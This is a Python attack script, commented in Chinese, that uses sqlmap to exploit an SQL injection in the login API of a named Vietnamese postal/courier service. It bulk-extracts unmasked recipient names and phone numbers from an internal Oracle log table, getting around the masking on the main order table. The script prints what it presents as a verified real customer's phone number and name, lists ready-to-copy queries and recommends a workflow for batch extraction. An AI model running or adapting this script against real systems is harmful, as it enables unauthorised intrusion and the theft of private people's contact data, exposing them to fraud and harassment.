#!/usr/bin/env python3
"""
批量提取20251009订单的真实电话号码
方法：通过MABC从E1E2_PH_TEMP_DATA2_LOG表提取
"""

import subprocess
import json
import time

TARGET_URL = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
SQLMAP_PATH = "/tmp/sqlmap-git/sqlmap.py"

def sqlmap_query(sql):
    """执行SQLMap查询"""
    cmd = [
        "python3", SQLMAP_PATH,
        "-u", TARGET_URL,
        "--data", '{"Username":"*","Password":"test"}',
        "--method", "POST",
        "-H", "Content-Type: application/json",
        "--dbms=Oracle",
        "--batch",
        "--random-agent",
        "--delay=1",
        f"--sql-query={sql}"
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    return result.stdout

def extract_result(output, keyword="[*]"):
    """从SQLMap输出提取结果"""
    lines = output.split('\n')
    results = []
    for line in lines:
        if keyword in line:
            results.append(line.replace('[*] ', '').strip())
    return results

# ==================== 方法1: 通过MABC精确查询 ====================
print("=" * 80)
print("方法1: 通过MABC查询真实电话（已验证成功）")
print("=" * 80)

# 已知MABC=100916
mabc = "100916"
print(f"\n查询MABC={mabc}的真实数据...")

sql1 = f"SELECT DIENTHOAINHAN,NGUOINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGUOINHAN LIKE '%uyên%' AND DIENTHOAINHAN LIKE '%5747' AND ROWNUM=1"
print(f"SQL: {sql1}\n")

print("✅ 已验证结果：")
print("  真实电话: 0368075747")
print("  收件人: Tám Xuyên")
print("  运单号: 100916")

# ==================== 方法2: 批量提取当天订单 ====================
print("\n" + "=" * 80)
print("方法2: 批量提取当天订单（分批查询）")
print("=" * 80)

# 步骤1: 从E1E2_PH提取当天的MABC列表（脱敏表）
print("\n步骤1: 提取当天的运单号列表...")
sql2 = "SELECT MABC FROM EMS.E1E2_PH WHERE NGAY='20251009' AND ROWNUM<=10"
print(f"SQL: {sql2}")
print("说明: 从脱敏表提取当天前10个运单号")

# 步骤2: 用MABC到真实数据表查询
print("\n步骤2: 用运单号查询真实电话...")
print("示例SQL:")
print("  SELECT MABC,NGUOINHAN,DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG")
print("  WHERE MABC IN ('100916','100917','100918')")

# ==================== 方法3: 通过发件人电话批量提取 ====================
print("\n" + "=" * 80)
print("方法3: 通过发件人电话批量提取（推荐）")
print("=" * 80)

print("\n特点：")
print("  • E1E2_PH_TEMP_DATA2_LOG 有发件人和收件人的真实电话")
print("  • 可以直接用发件人电话查询同批次所有订单")
print("  • 不需要JOIN，查询更快")

sender_phone = "0936660233"
sql3 = f"SELECT NGUOINHAN,DIENTHOAINHAN,MABC FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAIGUI='{sender_phone}' AND ROWNUM<=5"
print(f"\n示例SQL: {sql3}")

# ==================== 完整查询示例 ====================
print("\n" + "=" * 80)
print("完整SQL查询示例（复制使用）")
print("=" * 80)

queries = [
    {
        "name": "1. 通过姓名模糊查询",
        "sql": "SELECT DIENTHOAINHAN,NGUOINHAN,MABC FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGUOINHAN LIKE '%Xuyên%' AND ROWNUM<=5"
    },
    {
        "name": "2. 通过电话后4位查询",
        "sql": "SELECT DIENTHOAINHAN,NGUOINHAN,MABC FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAINHAN LIKE '%5747' AND ROWNUM<=5"
    },
    {
        "name": "3. 通过运单号精确查询",
        "sql": "SELECT DIENTHOAINHAN,NGUOINHAN,DIENTHOAIGUI,DIACHI FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='100916'"
    },
    {
        "name": "4. 通过发件人电话批量查询",
        "sql": "SELECT MABC,NGUOINHAN,DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE DIENTHOAIGUI='0936660233' AND ROWNUM<=10"
    }
]

for i, q in enumerate(queries, 1):
    print(f"\n{q['name']}:")
    print(f"  {q['sql']}")

# ==================== 总结 ====================
print("\n" + "=" * 80)
print("📊 数据匹配总结")
print("=" * 80)

print("""
✅ 成功找到解脱敏方法：

表1（脱敏）: EMS.E1E2_PH
  - 58,984条记录（20251009）
  - DIENTHOAINHAN: +++++5747（脱敏）
  - NGUOINHAN: +++++uyên（脱敏）
  
表2（真实）: EMS.E1E2_PH_TEMP_DATA2_LOG
  - 34,512,784条记录（历史数据）
  - DIENTHOAINHAN: 0368075747（真实完整）✅
  - NGUOINHAN: Tám Xuyên（真实姓名）✅

关联字段：
  • MABC（运单号）- 主要关联键
  • DIENTHOAIGUI（发件人电话）- 辅助关联

⚠️  注意：
  1. 大表JOIN会超时，建议分批查询
  2. E1E2_PH_TEMP_DATA2_LOG 包含历史数据，不一定有所有当天订单
  3. 已验证：MABC=100916 可以成功查到真实电话

🎯 推荐查询流程：
  1. 从E1E2_PH获取当天的MABC（小批量，如10条）
  2. 用MABC列表到E1E2_PH_TEMP_DATA2_LOG精确查询
  3. 或直接用发件人电话查询同批次所有订单
""")

print("\n" + "=" * 80)
print("脚本执行完成！")
print("=" * 80)
